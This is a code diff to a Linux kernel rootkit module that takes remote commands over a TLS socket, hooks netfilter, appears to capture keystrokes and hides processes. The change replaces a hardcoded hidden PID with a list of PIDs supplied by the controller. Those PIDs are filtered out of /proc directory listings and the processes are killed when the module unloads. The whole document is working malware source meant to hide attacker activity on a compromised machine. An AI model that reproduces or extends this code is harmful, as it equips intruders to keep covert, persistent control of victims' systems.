@@ -64,12 +64,16 @@ size_t closed_port_count = 0;
 bool hidden = 0;
 static struct list_head* mod_list;
 
+#if 0
 struct task_pid {
     struct task_struct* ts;
     struct pid* p;
 };
 
 static struct task_pid hidden_procs[10];
+#endif
+
+static size_t hidden_procs[100];
 int hidden_count = 0;
 static rwlock_t* my_tasklist_lock;
 
@@ -356,12 +360,13 @@ void read_TLS(struct work_struct* work) {
             hide();
         }
     } else if (memcmp("hide", buffer, 4) == 0) {
-#if 0
         if (kstrtou16(buffer + 5, 10, &tmp_port)) {
             strcpy(buffer, bad_port);
             send_msg(svc->tls_socket, buffer, strlen(bad_port));
             return;
         }
+
+#if 0
         for_each_process(ts) {
             if (ts->pid == tmp_port) {
                 printk(KERN_INFO "Hiding PID %d\n", tmp_port);
@@ -381,6 +386,9 @@ void read_TLS(struct work_struct* work) {
                 write_unlock(my_tasklist_lock);
             }
         }
+#else
+        //Store the pid in the hidden proc list
+        hidden_procs[hidden_count++] = tmp_port;
 #endif
     } else {
         strcpy(buffer, unknown);
@@ -575,8 +583,17 @@ void consume_keys(struct work_struct* work) {
 
 static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
         u64 ino, unsigned int d_type) {
-    if (strncmp(proc_name, "1340", strlen("1340")) == 0) {
-        return 0;
+    char p[64];
+    int i;
+
+    for (i = 0; i < hidden_count; ++i) {
+        memset(p, 0, 64);
+        //Convert stored pid to string
+        snprintf(p, 64, "%lu", hidden_procs[i]);
+
+        if (strncmp(proc_name, p, strlen(p)) == 0) {
+            return 0;
+        }
     }
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
 }
@@ -673,6 +690,8 @@ static int __init mod_init(void) {
  */
 static void __exit mod_exit(void) {
     int i;
+    struct task_struct* ts;
+
     nf_unregister_net_hook(&init_net, &nfho);
     nf_unregister_net_hook(&init_net, &nfhi);
 
@@ -706,6 +725,17 @@ static void __exit mod_exit(void) {
         //Decrement the refcount to reset pid struct
         put_pid(hidden_procs[i].p);
         force_sig(SIGKILL, hidden_procs[i].ts);
+    }
+    write_unlock(my_tasklist_lock);
+#else
+    write_lock(my_tasklist_lock);
+    for (i = 0; i < hidden_count; ++i) {
+        for_each_process(ts) {
+            if (ts->pid == hidden_procs[i]) {
+                //Force kill any hidden process on cleanup
+                force_sig(SIGKILL, ts);
+            }
+        }
     }
     write_unlock(my_tasklist_lock);
 #endif
